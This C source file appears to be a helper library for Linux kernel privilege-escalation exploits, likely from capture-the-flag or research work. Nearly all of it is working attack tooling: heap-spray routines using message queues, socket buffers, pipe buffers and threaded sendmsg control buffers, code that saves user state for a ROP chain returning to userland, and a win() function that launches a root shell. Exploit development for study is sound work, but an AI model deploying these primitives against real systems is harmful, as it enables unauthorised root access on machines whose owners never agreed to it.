#define _GNU_SOURCE

#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <unistd.h>

#include <pthread.h>
#include <sched.h>
#include <signal.h>

#include <sys/msg.h>
#include <sys/resource.h>
#include <sys/socket.h>

#include "kutil.h"

static char buf[0x1000];

// Standard setup

void win() {
	if (getuid() == 0) {
		printf("[+] wow!! i got root\n");
		system("/bin/sh");
	} else {
		printf("[-] i didn't get root :(\n");
	}
	exit(0);
}

void force_single_core(int cpu) {
	cpu_set_t c;
	CPU_ZERO(&c);
	CPU_SET(cpu, &c);
	sched_setaffinity(0, sizeof(cpu_set_t), &c);
}

void save_state(struct state * s) {
	uint64_t a, b, c, d;
	asm(
		"movq %%cs, %0\n"
		"movq %%ss, %1\n"
		"movq %%rsp, %2\n"
		"pushfq\n" // remark: this pushes rflags onto the stack.
		"popq %3\n"
		: "=r"(a), "=r"(b), "=r"(c), "=r"(d)
		:
		: "memory");
	s->user_cs = a;
	s->user_ss = b;
	s->user_rsp = c;
	s->user_rflags = d;
}

void init_exploit(struct state * s, void * sigsegv_handler) {
	force_single_core(0);
	if (sigsegv_handler) {
		signal(SIGSEGV, sigsegv_handler);
	}
	save_state(s);
}

// Specialised setup

int increase_fd_limit() {
	struct rlimit lim;
	getrlimit(RLIMIT_NOFILE, &lim);
	lim.rlim_cur = lim.rlim_max;
	setrlimit(RLIMIT_NOFILE, &lim);
	return lim.rlim_max;
}

// Message queues

void msgq_init(int fd[], int num) {
	for (int i=0; i<num; i++) {
		if ((fd[i] = msgget(IPC_PRIVATE, IPC_CREAT | 0666)) < 0) {
			perror("[-] msgget");
			exit(-1);
		}
	}
}

void msgq_send(int fd, void * msgp, size_t msglen) {
	if (msgsnd(fd, msgp, msglen, 0) < 0) {
		perror("[-] msgsnd");
		exit(-1);
	}
}

void msgq_copy(int fd, void * msgp, size_t msglen, long index) {
	if (msgrcv(fd, msgp, msglen, index, MSG_COPY | IPC_NOWAIT) < 0) {
		perror("[-] msgrcv");
		exit(-1);
	}
}

void msgq_recv(int fd, void * msgp, size_t msglen, long msgtyp) {
	if (msgrcv(fd, msgp, msglen, msgtyp, 0) < 0) {
		perror("[-] msgrcv");
		exit(-1);
	}
}

void msgq_spray(int fd[], int num, void * msgp, size_t msglen) {
	for (int i=0; i<num; i++) {
		msgq_send(fd[i], msgp, msglen);
	}
}

void msgq_unspray(int fd[], int num, void * msgp, size_t msglen, long msgtyp) {
	for (int i=0; i<num; i++) {
		msgq_recv(fd[i], msgp, msglen, msgtyp);
	}
}

// Sockets

void skpair_init(int fd[][2], int num, int domain, int type, int protocol) {
	for (int i=0; i<num; i++) {
		if (socketpair(domain, type, protocol, fd[i]) < 0) {
			perror("[-] socketpair");
			exit(-1);
		}
	}
}

void skbuff_spray(int fd[][2], int num_sock, int num_per_sock, char * buf, size_t size) {
	for (int i=0; i<num_sock; i++) {
		for (int j=0; j<num_per_sock; j++) {
			if (write(fd[i][0], buf, size) < 0) {
				perror("[-] write");
				exit(-1);
			}
		}
	}
}

void skbuff_unspray(int fd[][2], int num_sock, int num_per_sock, char * buf, size_t size) {
	for (int i=0; i<num_sock; i++) {
		for (int j=0; j<num_per_sock; j++) {
			if (read(fd[i][1], buf, size) < 0) {
				perror("[-] read");
				exit(-1);
			}
		}
	}
}

// Pipes

void pipe_init(int fd[][2], int num) {
	for (int i=0; i<num; i++) {
		if (pipe(fd[i]) < 0) {
			perror("[-] pipe");
			exit(-1);
		}
	}
}
void pipe_buffer_spray(int fd[][2], int num) {
	for (int i=0; i<num; i++) {
		if (write(fd[i][1], "blah", 4) < 0) { // Doesn't matter what we write here, the actual data isn't stored in pipe_buffer anyway. Just need to get it to generate first.
			perror("[-] write");
			exit(-1);
		}
	}
}

void pipe_free(int fd[][2], int num) {
	for (int i=0; i<num; i++) {
		if (close(fd[i][0]) < 0 || close(fd[i][1]) < 0) {
			perror("[-] close");
			exit(-1);
		}
	}
}

// ctl_buf sprays

static void * job(void * ptr) {
	struct ctl_buf_spray_per_thread_context * ptc = (struct ctl_buf_spray_per_thread_context *) ptr;
	struct ctl_buf_spray_context * c = ptc->main_context;
	size_t idx = ptc->idx;
	
	write(c->cfd[0], buf, 1); // Signal to main process that thread is ready
	
	read(c->cfd[0], buf, 1); // Wait for main process to signal start of spray
	
	//free(ptc);
	
	struct iovec iov = {buf, 0x1000};
	struct msghdr mhdr = {
		.msg_iov = &iov,
		.msg_iovlen = 1,
		.msg_control = c->payload,
		.msg_controllen = c->size
	};
	if (sendmsg(c->sfd[idx][1], &mhdr, 0) < 0) {
		perror("[-] sendmsg");
	}
	
	while (1) {
		sleep(100);
	}
}

struct ctl_buf_spray_context * init_ctl_buf_spray(int num, char * payload, size_t size) {
	struct ctl_buf_spray_context * c = malloc(sizeof(struct ctl_buf_spray_context) + sizeof(int[num][2]));
	c->num = num;
	c->payload = payload;
	c->size = size;
	
	int n = 0x1000;
	skpair_init(&c->cfd, 1, AF_UNIX, SOCK_STREAM, 0);
	skpair_init(c->sfd, c->num, AF_UNIX, SOCK_DGRAM, 0);
	for (int i=0; i<c->num; i++) {
		setsockopt(c->sfd[i][1], SOL_SOCKET, SO_SNDBUF, (char *)&n, sizeof(n));
		setsockopt(c->sfd[i][0], SOL_SOCKET, SO_RCVBUF, (char *)&n, sizeof(n));
		write(c->sfd[i][1], buf, 0x1000);
	}
	
	struct cmsghdr *first;
	first = (struct cmsghdr *) c->payload;
	first->cmsg_len = c->size;
	first->cmsg_level = 0; // must be different than SOL_SOCKET=1 to "skip" cmsg
	first->cmsg_type = 0x41414141;

	pthread_t tid;
	struct ctl_buf_spray_per_thread_context * ptc;
	for (int i=0; i<c->num; i++) {
		ptc = malloc(sizeof(struct ctl_buf_spray_per_thread_context));
		ptc->main_context = c;
		ptc->idx = i;
		pthread_create(&tid, 0, job, (void *) ptc);
	}
	read(c->cfd[1], buf, c->num); // Wait for all threads to signal they are ready
	return c;
}

void trigger_ctl_buf_spray(struct ctl_buf_spray_context * c) {
	write(c->cfd[1], buf, c->num); // Signal all threads to start spray
	sleep(1); // I would swap this out for a thread write / main process read, but it breaks my exploit for some reason...
}

void release_ctl_buf_spray(struct ctl_buf_spray_context * c) {
	for (int i=0; i<c->num; i++) {
		read(c->sfd[i][0], buf, 0x1000);
	}
	sleep(1); // Give the kernel some time to free the sprayed objects
}

// Sync

void sync_init(int * cfd) {
	skpair_init((int(*)[2]) cfd, 1, AF_UNIX, SOCK_STREAM, 0);
}

void sync_wait_ready(int cfd[2], int num) {
	read(cfd[1], buf, num);
}

void sync_thread_ready(int cfd[2]) {
	write(cfd[0], buf, 1);
	read(cfd[0], buf, 1);
}

void sync_release(int cfd[2], int num) {
	write(cfd[1], buf, num);
}

// ROP

void load_state(void * ptr, void * win, struct state * s) {
	uint64_t * rop = ptr;
	*rop++ = (uint64_t) win;
	*rop++ = s->user_cs;
	*rop++ = s->user_rflags;
	*rop++ = s->user_rsp;
	*rop++ = s->user_ss;
}

// Misc

void debug(char * cmd, char * buf, size_t n) {
	FILE * fp = popen(cmd, "r");
	fread(buf, 1, n, fp);
	pclose(fp);
}
